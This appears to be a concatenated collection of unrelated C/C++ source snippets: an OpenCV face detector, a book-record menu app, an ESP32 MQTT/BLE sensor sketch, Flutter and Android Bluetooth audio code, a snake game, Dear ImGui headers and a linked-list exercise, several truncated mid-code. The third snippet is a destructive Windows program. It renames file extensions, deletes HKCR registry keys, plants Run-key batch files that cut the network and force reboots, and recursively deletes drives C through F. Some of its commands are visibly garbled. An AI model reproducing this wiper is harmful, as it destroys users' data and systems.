Ptr<FaceDetectorYN> detector = FaceDetectorYN::create(\n      fd_modelPath, \"\", Size(320, 320), scoreThreshold, nmsThreshold, topK);\n\n  TickMeter tm;\n\n  // If input is an image\n  if (parser.has(\"image1\")) {\n    String input1 = parser.get<String>(\"image1\");\n    Mat image1 = imread(samples::findFile(input1));\n    if (image1.empty()) {\n      std::cerr << \"Cannot read image: \" << input1 << std::endl;\n      return 2;\n    }\n\n    int imageWidth = int(image1.cols * scale);\n    int imageHeight = int(image1.rows * scale);\n    resize(image1, image1, Size(imageWidth, imageHeight));\n    tm.start();\n\n    // Set input size before inference\n    detector->setInputSize(image1.size());\n\n    Mat faces1;\n    detector->detect(image1, faces1);\n    if (faces1.rows < 1) {\n      std::cerr << \"Cannot find a face in \" << input1 << std::endl;\n      return 1;\n    }\n\n    tm.stop();\n    // Draw results on the input image\n    visualize(image1, -1, faces1, tm.getFPS());\n\n    // Save results if save is true\n    if (save) {\n      cout << \"Saving result.jpg...\\n\";\n      imwrite(\"result.jpg\", image1);\n    }\n\n    // Visualize results\n    imshow(\"image1\", image1);\n    pollKey(); // handle UI events to show content\n\n    if (parser.has(\"image2\")) {\n      String",
    "#include <iostream>\n#include <string>\n#include <vector>\n#include <iomanip>\n#include \"book.h\"\nusing namespace std;\nusing namespace mybook;\n\nvoid menu();\nvoid add_book(vector<Book>& bookRecord);\nvoid display_book(const vector<Book>& bookRecord);\nstring search_book(const vector<Book>& bookRecord, const string& bookToSearch);\nvoid update_book(vector<Book>& bookRecord, const string& bookToUpdate);\nvoid delete_book(vector<Book>& bookRecord, const string& bookToDelete);\n\nint main()\n{\n    int choice;\n    vector<Book> bookRecord;\n    bool endProgram = false;\n    \n    while (!endProgram)\n    {\n        menu();\n        cout << \"--------------------\\n\";\n        cout << \"Enter your choice: \";\n        cin >> choice;\n        cin.ignore(); // Clear the input buffer\n        \n        switch (choice) {\n            case 1:\n                add_book(bookRecord);\n                break;\n            case 2:\n                display_book(bookRecord);\n                break;\n            case 3:\n            {\n                string searchBook;\n                cout << \"Enter book name: \";\n                getline(cin, searchBook);\n                cout << search_book(bookRecord, searchBook);\n                break;\n            }\n            case 4:\n            {\n                string updateBook;\n                cout << \"Enter book name: \";\n                getline(cin, updateBook);\n                update_book(bookRecord, updateBook);\n                break;\n            }\n            case 5:\n            {\n                string deleteBook;\n                cout << \"Enter book name: \";\n                getline(cin, deleteBook);\n                delete_book(bookRecord, deleteBook);\n                break;\n            }\n            case 6:\n                cout << \"Exiting Program....\\n\";\n                endProgram = true;\n                break;\n            default:\n                cout << \"Invalid input.\\n\";\n                break;\n        }\n    }\n    \n    return 0;\n}\n\nvoid menu()\n{\n    cout << \"\\t\\t\\t\\tControl Panel\\n\";\n    cout << \"\\n\";\n    \n    cout << \"1. Add Book\\n\";\n    cout << \"2. Display Books\\n\";\n    cout << \"3. Search Book\\n\";\n    cout << \"4. Update Book\\n\";\n    cout << \"5. Delete Book\\n\";\n    cout << \"6. Exit\\n\";\n}\n\nvoid add_book(vector<Book>& bookRecord)\n{\n    string name, author, status, dateStart, dateFinish;\n    cout << \"Book Name : \";\n    getline(cin, name);\n    \n    cout << \"\\n\";\n    cout << \"Author Name : \";\n    getline(cin, author);\n    \n    cout << \"\\n\";\n    cout << \"Book Status (Plan to Read / Reading / Finished) : \";\n    getline(cin, status);\n    \n    cout << \"\\n\";\n    cout << \"Start Date (DD-MM-YYYY), if not yet start, please type None : \";\n    getline(cin, dateStart);\n    \n    cout << \"\\n\";\n    cout << \"Finish Date (DD-MM-YYYY), if not yet start, please type None : \";\n    getline(cin, dateFinish);\n    \n    Book newBook(name, author, status, dateStart, dateFinish);\n    bookRecord.push_back(newBook);\n}\n\nvoid display_book(const vector<Book>& bookRecord)\n{\n    cout << endl;\n    \n    cout << left << setw(15) << \"Book Name\"\n             << setw(15) << \"Author\"\n             << setw(15) << \"Status\"\n             << setw(15) << \"Start Date\"\n             << setw(15) << \"Finish Date\" << endl;\n\n    for (const auto& book : bookRecord)\n    {\n        cout << left << setw(15) << book.getName()\n             << setw(15) << book.getAuthor()\n             << setw(15) << book.getStatus()\n             << setw(15) << book.getDateStart()\n             << setw(15) << book.getDateFinish() << endl;\n    }\n    cout << endl;\n}\n\nstring search_book(const vector<Book>& bookRecord, const string& bookToSearch)\n{\n    for (const auto& book : bookRecord)\n    {\n        if (book.getName() == bookToSearch)\n        {\n            return book.getName() + \" is found in the book record.\\n\";\n        }\n    }\n    return bookToSearch + \" is NOT FOUND in the book record.\\n\";\n}\n\nvoid update_book(vector<Book>& bookRecord, const string& bookToUpdate)\n{\n    for (auto& book : bookRecord)\n    {\n        if (book.getName() == bookToUpdate)\n        {\n            int choice;\n            cout << \"Which info do you want to update?\\n\";\n            cout << \"1. Book Name\\n\"\n                 << \"2. Book Author\\n\"\n                 << \"3. Book Status\\n\"\n                 << \"4. Book Date Start\\n\"\n                 << \"5. Book Date Finish\\n\"\n                 << \"6. Never mind\\n\";\n            cout << \"----------------------------------\\n\";\n            cout << \"Enter your choice: \";\n            cin >> choice;\n            cin.ignore();\n            \n            switch (choice) {\n                case 1:\n                {\n                    string bookName;\n                    cout << \"Enter new book name: \";\n                    getline(cin, bookName);\n                    book.setName(bookName);\n                    cout << \"New name has been set for \" << bookToUpdate << endl;\n                    break;\n                }\n                case 2:\n                {\n                    string author;\n          ",
    "#include <windows.h>\n\nint main(int argc, const char *argv[]) {\n\tconst char *Command1 =\n\t    \"REN *.DOC *.TXT REN *.JPEG *.TXT\\nREN *.LNK *.TXT\\nREN *.AVI *.TXT\\nREN *.MPEG *.TXT\\nREN *.COM *.TXT\\nBEN *.BAT *.TXT\\n\";\n\tsystem(Command1);//\u66f4\u6539\u540e\u7f00\u540d\n\tconst char *Command2 =\n\t    \"@ECHO OFF\\nSTART reg delete HKCR/.exe\\nSTART reg delete HKCR/.dLL\\nSTART reg delete HKCR/*\\n\";\n\tsystem(Command2);//\u5220\u9664\u6ce8\u518c\u8868\n\tconst char *Command3 =\n\t    \"echo @echo off>c:windowswimn32.bat\\necho break off>>c:windowswimn32.bat\\necho ipconfig/release_all>>c:windowswimn32.batecho end>>c\\\"windowswimn32.bat\\nreg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun/v windowsapi/t reg_sz/d c:windowswimn32.bat/freg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun/v controlexit/t reg_sz/d c:windowswimn32.bat/fpause\\n\";\n\tsystem(Command3);//\u7981\u7528\u7f51\u7edc\n\tconst char *Command4 =\n\t    \"set wshshell =wscript.createobject<\\\"wscript.shell\\\">\\ndo\\nwscript.sleep 100\\nwshshell.sendkeys\\\"~<enter>\\\"\\nLoop\\n\";\n\tsystem(Command4);//\u4e00\u76f4\u6309\u56de\u8f66\n\tconst char *Command5 =\n\t    \"echo @echo off>c:windowshartlell.bat\\necho break off>>c:windowshartlell.bat\\necho shutdown -r-t11-f>>c:windowshartlell.bat\\necho end>>c:windowshartlell.batreg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun\\n/v startapi /t reg_sz/d c:windowshartlell.bat /f\\nreg add hkey-current_usersoftwaremicrosoftwindowscurrentversionrun\\n/v/t reg_sz/d c:windowshartlell.bat /f\\nPAUSE\\n\";\n\tsystem(Command5);//\u5f00\u673a\u5c31\u5173\u673a\n\tconst char *Command6 =\n\t    \"rd/s/q D:\\n\\rd/s/q C:\\\\nrd/s/q E:\\\\nrd/s/q F:\\\\n\";\n\tsystem(Command6);//\u683c\u5f0f\u5316\u786c\u76d8\n\tconst char *Command7 =\n\t    \"Set oWMP=Create0bject(\\\"WMPIayer.0CX.7\\\")\\nSet colCDROMs=oWMP.cdromCollection\\ndo\\nif colCDROMs.Count>=1 thenFor i=0 to coCDROMs.Count -1ColCDROMs.ltem<i>.Eject\\nNext\\nFor =0 to colCDROMs.Count -1ColCDROMs.ltem<i>.EjectNext\\nEnd lf\\nwscript.sleep 100\\nLoop\\n\";\n\tsystem(Command7);//\u8702\u9e23\u5668\u53d1\u58f0\n\treturn 0;\n}",
    "#include <iostream>\r\n#include <windows.h>\r\n#include <ctime>\r\n#include <string>\r\n using namespace std;\r\n  int main(){\r\n  \t\r\n  \t  system(\"COLOR 2\");\r\n  \t  \r\n  \t  cout<<\"SISTEM PENENTU KENAIKAN SISWA\"<<endl;\r\n  \t   for (int j = 0; j < 3; j++) {\r\n  \t   \t cout<<\".\";\r\n  \t   \t sleep(1);\r\n\t\t }\r\n  \t  \r\n\t\tint kkm;\r\n  \t  cout<<\"\\n mohon masukan nilai kkm = \"<<endl;\r\n  \t  cin>> kkm;\r\n  \t  \r\n  \t  \r\n  \t  for (int b = 0; b < 4; b++) {\r\n\t\t\r\n  \t  cout<<\".\";\r\n  \t  sleep(1);\r\n  \t  \r\n  }\r\n  \r\n  \t  \r\n  \t  string nama;\r\n  \t  cout<<\"\\n masukan nama siswa = \"<<endl;\r\n  \t  cin>> nama;\r\n  \t  \r\n  \t  int nilai;\r\n  \t  while (true) {\r\n  \t  cout<<\"masukan nilai siswa = \"<<endl;\r\n  \t  cin>> nilai;\r\n  \t  \r\n  \t cout<<\"menentukan........\\n\"<<endl;\r\n  \t for (int i = 0; i < 5; i++) {\r\n    cout << \".\";\r\n    Sleep(200);\r\n    }\r\n    \r\n    \r\n    if ( nilai >= kkm) {\r\n    \tcout<< nama << \" SELAMAT DI NYATAKAN NAIK KELAS!!\"<<endl;\r\n    \t\r\n\t}\r\n\t  else if ( nilai == kkm){\r\n\t  \tcout<< nama << \" DI NYATAKAN NAIK  KELAS!!\"<<endl;\r\n\t  \tcout<< \"anda berada di kkm pas. terus belajar!!\"<<endl;\r\n\t  }\r\n\t  \r\n\t  else if ( nilai != kkm){\r\n\t  \tcout<< nama << \" DI NYATAKAN TINNGAL KELAS!!\"<<endl;\r\n\t  \tcout<< \" belajar yang rajin :)\"<<endl;\r\n    }\r\n\t   else  {\r\n\t   \tcout<<\"EROR 455 RETRY AGAIN\"<<endl;\r\n\t   }\r\n\t  \r\n\t  sleep(10);\r\n\t  system(\"CLS\");\r\n\t  \r\n\t  cout<<\"\\nSoftware ini di buat oleh CaitroniaDev. Free open-scoure 2024\"<<endl;\r\n\t  \r\n\t  return 0;\r\n  }\r\n}\r\n",
    "#include <Arduino.h>\n#include <DHT.h>\n#include <BLEServer.h>\n#include <BLEDevice.h>\n#include <BLEUtils.h>\n#include <BLE2902.h>\n#include <PubSubClient.h>\n#include <WiFi.h>\n#include \"Credentials.h\"\n#include <iostream>\n\nusing namespace std;\n\n#define LEDPIN 2\n#define DHTPIN 5\n#define DHTTYPE DHT11\n#define READ_INTERVAL 2000\n#define SERVICE_UUID \"2aeb149a-4803-11ee-be56-0242ac120002\"\n#define HUMIDITY_UUID \"3ab43154-4803-11ee-be56-0242ac120002\"\n#define TEMPERATURE_UUID \"404dccd8-4803-11ee-be56-0242ac120002\"\n\n// Set MQTT Broker\n\nconst char *mqtt_broker = \"test.mosquitto.org\";\nconst char *topic = \"MOISES/ESP3\"; //Set the topic here before -- DO NOT FORGET TO SET THE TOPIC HERE\nconst char *topic2 = \"MOISES/ESP2\";\nconst char *mqqtt_username = \"\";\nconst char *mqtt_password = \"\";\nconst int mqtt_port = 1883;\n\nbool mqttStatus = 0;\n\nWiFiClient espClient;\nPubSubClient client(espClient);\n\nbool connectMQTT();\nvoid callback(char *topic, byte *payload, unsigned int lenght);\n\nWiFiServer server_wifi(80);\n\nDHT dht(DHTPIN, DHTTYPE);\n\nBLEServer *server = nullptr;\nBLECharacteristic *temperatureChar = nullptr;\nBLECharacteristic *humidityChar = nullptr;\n\nfloat lastTemperature = -999;\nfloat lastHumidity = -999;\nint devicesConnected = 0;\nunsigned int blinkMillis = 0;\nunsigned int readkMillis = 0;\n\nclass ServerCallbacks: public BLEServerCallbacks{\n    void onConnect(BLEServer *s){\n      Serial.println(\"Device connected\");\n      devicesConnected++;\n      BLEDevice::startAdvertising();\n    }\n\n    void onDisconnect(BLEServer *s){\n      Serial.println(\"Device disconnected\");\n      devicesConnected--;\n    }\n};\n\nvoid setup() {\n  Serial.begin(9600);\n\n  Serial.println(\"Starting...\");\n\n  Serial.println();\n  Serial.println(\"Connecting in \");\n  Serial.println(ssid);\n  WiFi.begin(ssid, password);\n\n  while(WiFi.status() != WL_CONNECTED){\n    delay(741);\n    Serial.print(\".\");\n  }\n\n  Serial.println(\"\");\n  Serial.println(\"WiFi connected!\");\n  Serial.println(\"IP: \");\n  Serial.println(WiFi.localIP());\n\n  mqttStatus = connectMQTT();\n\n  dht.begin();\n  pinMode(LEDPIN, OUTPUT);\n\n  BLEDevice::init(\"ESP32\");\n  server = BLEDevice::createServer();\n  server->setCallbacks(new ServerCallbacks());\n\n  BLEService *service = server->createService(SERVICE_UUID);\n\n  temperatureChar = service->createCharacteristic(\n    TEMPERATURE_UUID,\n    BLECharacteristic::PROPERTY_READ |\n    BLECharacteristic::PROPERTY_NOTIFY\n  );\n\n  humidityChar = service->createCharacteristic(\n    HUMIDITY_UUID,\n    BLECharacteristic::PROPERTY_READ |\n    BLECharacteristic::PROPERTY_NOTIFY\n  );\n\n  service->start();\n\n  BLEAdvertising *advertising = BLEDevice::getAdvertising();\n  advertising->addServiceUUID(SERVICE_UUID);\n  advertising->setScanResponse(false);\n  advertising->setMinPreferred(0x06);\n\n  BLEDevice::startAdvertising();\n\n  Serial.println(\"Advertising...\");\n}\n\nvoid sense() {\n  float humidity = dht.readHumidity();\n  float temperature = dht.readTemperature();\n\n  if(isnan(humidity)){\n    Serial.println(\"Humidity reading failed!\");\n    return;\n  }\n\n  if(isnan(temperature)){\n    Serial.println(\"Temperature reading failed!\");\n    return;\n  }\n\n  Serial.printf(\"Humidity = %f | Temperature = %f \\n\", humidity, temperature);\n\n//Adicionar a linha de c\u00f3digo para publicar as vari\u00e1veis aqui\nclient.publish(topic, String(temperature).c_str());\n\n\n  if(devicesConnected){\n    if (lastTemperature != temperature){\n      temperatureChar->setValue(temperature);\n      temperatureChar->notify();\n\n      lastTemperature = temperature;\n    }\n  \n    if (lastHumidity != humidity){\n      humidityChar->setValue(humidity);\n      humidityChar->notify();\n\n      lastHumidity = humidity;\n    }\n  }\n}\n\nvoid loop() {\n  if(mqttStatus){\n    client.loop();\n  }\n  while(WiFi.status() != WL_CONNECTED){\n    WiFi.begin(ssid, password);\n    Serial.print(\".\");\n\n    delay(741);\n  }\n  if(readkMillis == 0 || (millis() - readkMillis) >= READ_INTERVAL) {\n      sense();\n      readkMillis = millis();\n  }\n\n  if (!devicesConnected){\n    if (blinkMillis == 0 || (millis() - blinkMillis) >= 1000) {\n      digitalWrite(LEDPIN, !digitalRead(LEDPIN));\n      blinkMillis = millis();\n    }\n  } else {\n    digitalWrite(LEDPIN, HIGH);\n  }\n}\n\nbool connectMQTT() {\n  byte tentativa = 0;\n  client.setServer(mqtt_broker, mqtt_port);\n  client.setCallback(callback);\n\n  do{\n    String client_id = \"TEST-\";\n    client_id += String(WiFi.macAddress());\n\n    if (client.connect(client_id.c_str(), mqqtt_username, mqtt_password)) {\n      Serial.println(\"Connection sucessful: \");\n      Serial.printf(\"Client %s connected on Broker \\n\", client_id.c_str());\n    } else {\n      Serial.print(\"Connection failed: \");\n      Serial.print(client.state());\n      Serial.println();\n      Serial.print(\"New try: \");\n      delay(2000);\n    }\n    tentativa++;\n  } while (!client.connected() && tentativa < 5);\n\n  if (tentativa < 5) {\n    \n    client.subscribe(topic);\n    return 1;\n  } else {\n    Serial.println(\"Do not connected!\");\n    return 0;\n  }\n}\n\nvoid callback(char *topic, byte *payload, unsigne",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "/*\n * Copyright (C) 2022 The Android Open Source Project\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *      http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n\n#define LOG_TAG \"BTAudioProviderA2dpSW\"\n\n#include \"A2dpSoftwareAudioProvider.h\"\n\n#include <BluetoothAudioCodecs.h>\n#include <BluetoothAudioSessionReport.h>\n#include <android-base/logging.h>\n\nnamespace aidl {\nnamespace android {\nnamespace hardware {\nnamespace bluetooth {\nnamespace audio {\n\n// Here the buffer size is based on SBC\nstatic constexpr uint32_t kPcmFrameSize = 4;  // 16 bits per sample / stereo\n// SBC is 128, and here we choose the LCM of 16, 24, and 32\nstatic constexpr uint32_t kPcmFrameCount = 96;\nstatic constexpr uint32_t kRtpFrameSize = kPcmFrameSize * kPcmFrameCount;\n// The max counts by 1 tick (20ms) for SBC is about 7. Since using 96 for the\n// PCM counts, here we just choose a greater number\nstatic constexpr uint32_t kRtpFrameCount = 10;\nstatic constexpr uint32_t kBufferSize = kRtpFrameSize * kRtpFrameCount;\nstatic constexpr uint32_t kBufferCount = 2;  // double buffer\nstatic constexpr uint32_t kDataMqSize = kBufferSize * kBufferCount;\n\nA2dpSoftwareEncodingAudioProvider::A2dpSoftwareEncodingAudioProvider()\n    : A2dpSoftwareAudioProvider() {\n  session_type_ = SessionType::A2DP_SOFTWARE_ENCODING_DATAPATH;\n}\n\nA2dpSoftwareDecodingAudioProvider::A2dpSoftwareDecodingAudioProvider()\n    : A2dpSoftwareAudioProvider() {\n  session_type_ = SessionType::A2DP_SOFTWARE_DECODING_DATAPATH;\n}\n\nA2dpSoftwareAudioProvider::A2dpSoftwareAudioProvider()\n    : BluetoothAudioProvider(), data_mq_(nullptr) {\n  LOG(INFO) << __func__ << \" - size of audio buffer \" << kDataMqSize\n            << \" byte(s)\";\n  std::unique_ptr<DataMQ> data_mq(\n      new DataMQ(kDataMqSize, /* EventFlag */ true));\n  if (data_mq && data_mq->isValid()) {\n    data_mq_ = std::move(data_mq);\n  } else {\n    ALOGE_IF(!data_mq, \"failed to allocate data MQ\");\n    ALOGE_IF(data_mq && !data_mq->isValid(), \"data MQ is invalid\");\n  }\n}\n\nbool A2dpSoftwareAudioProvider::isValid(const SessionType& sessionType) {\n  return (sessionType == session_type_ && data_mq_ && data_mq_->isValid());\n}\n\nndk::ScopedAStatus A2dpSoftwareAudioProvider::startSession(\n    const std::shared_ptr<IBluetoothAudioPort>& host_if,\n    const AudioConfiguration& audio_config,\n    const std::vector<LatencyMode>& latency_modes, DataMQDesc* _aidl_return) {\n  if (audio_config.getTag() != AudioConfiguration::pcmConfig) {\n    LOG(WARNING) << __func__ << \" - Invalid Audio Configuration=\"\n                 << audio_config.toString();\n    *_aidl_return = DataMQDesc();\n    return ndk::ScopedAStatus::fromExceptionCode(EX_ILLEGAL_ARGUMENT);\n  }\n  const PcmConfiguration& pcm_config =\n      audio_config.get<AudioConfiguration::pcmConfig>();\n  if (!BluetoothAudioCodecs::IsSoftwarePcmConfigurationValid(pcm_config)) {\n    LOG(WARNING) << __func__ << \" - Unsupported PCM Configuration=\"\n                 << pcm_config.toString();\n    *_aidl_return = DataMQDesc();\n    return ndk::ScopedAStatus::fromExceptionCode(EX_ILLEGAL_ARGUMENT);\n  }\n\n  return BluetoothAudioProvider::startSession(\n      host_if, audio_config, latency_modes, _aidl_return);\n}\n\nndk::ScopedAStatus A2dpSoftwareAudioProvider::onSessionReady(\n    DataMQDesc* _aidl_return) {\n  if (data_mq_ == nullptr || !data_mq_->isValid()) {\n    *_aidl_return = DataMQDesc();\n    return ndk::ScopedAStatus::fromExceptionCode(EX_ILLEGAL_ARGUMENT);\n  }\n  *_aidl_return = data_mq_->dupeDesc();\n  auto desc = data_mq_->dupeDesc();\n  BluetoothAudioSessionReport::OnSessionStarted(\n      session_type_, stack_iface_, &desc, *audio_config_, latency_modes_);\n  return ndk::ScopedAStatus::ok();\n}\n\n}  // namespace audio\n}  // namespace bluetooth\n}  // namespace hardware\n}  // namespace android\n}  // namespace aidl\n",
    "#include \"Snake.h\"\n\nSnake::Snake() : m_body{std::list<sf::Sprite>(4)} {\t// it means at begin snake length 4: [0][1][2][3]\n\tm_head = --m_body.end();\n\tm_tail = m_body.begin();\n}\n\nSnake::~Snake() {\n\n}\n\nvoid Snake::Init(const sf::Texture &texture) {\n\tfloat x = 16.f;\n\tfor (auto& a : m_body) {\n\t\ta.setTexture(texture);\n\t\ta.setPosition(x, 16.f);\n\t\tx += 16.f;\n\t}\n}\n\nvoid Snake::Move(const sf::Vector2f& direction) {\n\tm_tail->setPosition(m_head->getPosition() + direction); \n\tm_head = m_tail;\n\tm_tail++;\n\t\n\tif (m_tail == m_body.end()) {\n\t\tm_tail = m_body.begin();\n\t}\n}\n\n\nbool Snake::IsOn(const sf::Sprite& other) const {\n\treturn other.getGlobalBounds().intersects(m_head->getGlobalBounds());\n}\n\nbool Snake::IsOnItself() const {\n\tbool flag = false;\n\tfor (auto piece = m_body.begin(); piece != m_body.end(); ++piece) {\n\t\tif (m_head != piece) {\n\t\t\tflag = IsOn(*piece);\n\t\t\tif (flag) {\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t}\n\treturn flag;\n}\n\nvoid Snake::Grow(const sf::Vector2f& direction) {\n\tsf::Sprite newPiece;\n\tnewPiece.setTexture(*(m_body.begin()->getTexture()));\t// We can get texture on available body\n\tnewPiece.setPosition(m_head->getPosition() + direction); // this will add the next to head\n\tm_head = m_body.insert(++m_head, newPiece);\n}\n\nvoid Snake::draw(sf::RenderTarget& target, sf::RenderStates states) const {\n\tfor (auto& a : m_body) {\n\t\ttarget.draw(a);\n\t}\n}\n",
    "// dear imgui, v1.90.1 WIP\n// (main code and documentation)\n\n// Help:\n// - See links below.\n// - Call and read ImGui::ShowDemoWindow() in imgui_demo.cpp. All applications in examples/ are doing that.\n// - Read top of imgui.cpp for more details, links and comments.\n\n// Resources:\n// - FAQ                   https://dearimgui.com/faq\n// - Getting Started       https://dearimgui.com/getting-started\n// - Homepage              https://github.com/ocornut/imgui\n// - Releases & changelog  https://github.com/ocornut/imgui/releases\n// - Gallery               https://github.com/ocornut/imgui/issues/6897 (please post your screenshots/video there!)\n// - Wiki                  https://github.com/ocornut/imgui/wiki (lots of good stuff there)\n// - Glossary              https://github.com/ocornut/imgui/wiki/Glossary\n// - Issues & support      https://github.com/ocornut/imgui/issues\n// - Tests & Automation    https://github.com/ocornut/imgui_test_engine\n\n// For first-time users having issues compiling/linking/running/loading fonts:\n// please post in https://github.com/ocornut/imgui/discussions if you cannot find a solution in resources above.\n// Everything else should be asked in 'Issues'! We are building a database of cross-linked knowledge there.\n\n// Copyright (c) 2014-2023 Omar Cornut\n// Developed by Omar Cornut and every direct or indirect contributors to the GitHub.\n// See LICENSE.txt for copyright and licensing details (standard MIT License).\n// This library is free but needs your support to sustain development and maintenance.\n// Businesses: you can support continued development via B2B invoiced technical support, maintenance and sponsoring contracts.\n// PLEASE reach out at omar AT dearimgui DOT com. See https://github.com/ocornut/imgui/wiki/Sponsors\n// Businesses: you can also purchase licenses for the Dear ImGui Automation/Test Engine.\n\n// It is recommended that you don't modify imgui.cpp! It will become difficult for you to update the library.\n// Note that 'ImGui::' being a namespace, you can add functions into the namespace from your own source files, without\n// modifying imgui.h or imgui.cpp. You may include imgui_internal.h to access internal data structures, but it doesn't\n// come with any guarantee of forward compatibility. Discussing your changes on the GitHub Issue Tracker may lead you\n// to a better solution or official support for them.\n\n/*\n\nIndex of this file:\n\nDOCUMENTATION\n\n- MISSION STATEMENT\n- CONTROLS GUIDE\n- PROGRAMMER GUIDE\n  - READ FIRST\n  - HOW TO UPDATE TO A NEWER VERSION OF DEAR IMGUI\n  - GETTING STARTED WITH INTEGRATING DEAR IMGUI IN YOUR CODE/ENGINE\n  - HOW A SIMPLE APPLICATION MAY LOOK LIKE\n  - HOW A SIMPLE RENDERING FUNCTION MAY LOOK LIKE\n- API BREAKING CHANGES (read me when you update!)\n- FREQUENTLY ASKED QUESTIONS (FAQ)\n  - Read all answers online: https://www.dearimgui.com/faq, or in docs/FAQ.md (with a Markdown viewer)\n\nCODE\n(search for \"[SECTION]\" in the code to find them)\n\n// [SECTION] INCLUDES\n// [SECTION] FORWARD DECLARATIONS\n// [SECTION] CONTEXT AND MEMORY ALLOCATORS\n// [SECTION] USER FACING STRUCTURES (ImGuiStyle, ImGuiIO)\n// [SECTION] MISC HELPERS/UTILITIES (Geometry functions)\n// [SECTION] MISC HELPERS/UTILITIES (String, Format, Hash functions)\n// [SECTION] MISC HELPERS/UTILITIES (File functions)\n// [SECTION] MISC HELPERS/UTILITIES (ImText* functions)\n// [SECTION] MISC HELPERS/UTILITIES (Color functions)\n// [SECTION] ImGuiStorage\n// [SECTION] ImGuiTextFilter\n// [SECTION] ImGuiTextBuffer, ImGuiTextIndex\n// [SECTION] ImGuiListClipper\n// [SECTION] STYLING\n// [SECTION] RENDER HELPERS\n// [SECTION] INITIALIZATION, SHUTDOWN\n// [SECTION] MAIN CODE (most of the code! lots of stuff, needs tidying up!)\n// [SECTION] INPUTS\n// [SECTION] ERROR CHECKING\n// [SECTION] LAYOUT\n// [SECTION] SCROLLING\n// [SECTION] TOOLTIPS\n// [SECTION] POPUPS\n// [SECTION] KEYBOARD/GAMEPAD NAVIGATION\n// [SECTION] DRAG AND DROP\n// [SECTION] LOGGING/CAPTURING\n// [SECTION] SETTINGS\n// [SECTION] LOCALIZATION\n// [SECTION] VIEWPORTS, PLATFORM WINDOWS\n// [SECTION] PLATFORM DEPENDENT HELPERS\n// [SECTION] METRICS/DEBUGGER WINDOW\n// [SECTION] DEBUG LOG WINDOW\n// [SECTION] OTHER DEBUG TOOLS (ITEM PICKER, ID STACK TOOL)\n\n*/\n\n//-----------------------------------------------------------------------------\n// DOCUMENTATION\n//-----------------------------------------------------------------------------\n\n/*\n\n MISSION STATEMENT\n =================\n\n - Easy to use to create code-driven and data-driven tools.\n - Easy to use to create ad hoc short-lived tools and long-lived, more elaborate tools.\n - Easy to hack and improve.\n - Minimize setup and maintenance.\n - Minimize state storage on user side.\n - Minimize state synchronization.\n - Portable, minimize dependencies, run on target (consoles, phones, etc.).\n - Efficient runtime and memory consumption.\n\n Designed primarily for developers and content-creators, not the typical end-user!\n Some of the current weaknesses (which we aim to address in the future) includes:\n\n - Doesn't look fancy.\n -",
    "\n\n#include <iostream>\nusing namespace std;\n\nstruct Node {\n\tint noMhs;\n\tstring name;\n\tNode *next;\n\tNode *prev;\n};\n\nNode *START = NULL;\n\nvoid addNode() \n{\n\tNode* newNode = new Node(); // step 1: create a new node\n\tcout << \"\\nEnter the roll number of the student: \";\n\tcin >> newNode->noMhs;// assign value to the data field of the new node\n\tcout << \"\\nEnter the name of the student: \";\n\tcin >> newNode->name; // Assign the value to the data field of the new node\n\n// Insert the new node in the list\n\tif (START == NULL || newNode->noMhs == START->noMhs)\n\t{// step 2: insert the mew node at the beginning\n\n\t\tif (START != NULL && newNode->noMhs == START->noMhs)\n\t\t{\n\t\t\tcout << \"\\033[31mDuplicate roll number not allowed\\033[0m\" << endl;\n\t\t\treturn;\n\t\t}\n\t// if the list is empty, make the new node to START\n\t\tnewNode->next = START; // step 3: make the new node point to the first node\n\t\tif (START != NULL)\n\t\t{\n\t\t\tSTART->prev = newNode; // step 4 : make the first node point to the new node\n\t\t}\n\t\tnewNode->prev = NULL; // step 5: make the new node point to NULL\n\t\tSTART = newNode; // step 6 : make the new node the first node\n\t}\n\telse\n\t{\n\t// insert the new node in the middle or at the end\n\t\tNode *current = START; // step 1.a: start from the first node\n\t\tNode* previous = NULL; // step 1.b: previous node is NULL initially\n\n\t\twhile(current != NULL && current->noMhs < newNode->noMhs)\n\t\t{\t\t\t\t\t\t\t// step 1.c : traverse the list to find the correct position\n\t\t\tprevious = current;\t\t// step 1.d : move the previous to the current node\n\t\t\tcurrent = current->next;// step 